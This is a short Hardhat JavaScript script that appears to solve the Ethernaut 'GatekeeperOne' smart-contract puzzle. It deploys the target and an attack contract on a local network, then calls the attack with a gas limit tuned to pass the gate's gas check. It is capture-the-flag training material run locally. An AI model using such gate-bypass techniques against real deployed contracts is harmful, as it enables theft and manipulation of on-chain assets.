const hre = require("hardhat");

async function main() {
  const [ownerDeployer, hacker] = await hre.ethers.getSigners();
  const provider = hre.ethers.provider;

  const GatekeeperOne = await hre.ethers.getContractFactory("GatekeeperOne");
  const gatekeeper = await GatekeeperOne.deploy();
  await gatekeeper.deployed();

  const Attack = await hre.ethers.getContractFactory("AttackGateKeeperOne");
  const attack = await Attack.deploy(gatekeeper.address);
  await attack.deployed();

  await attack.attack({gasLimit: 8191 + 293160});

  console.log(ownerDeployer.address == await gatekeeper.entrant())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
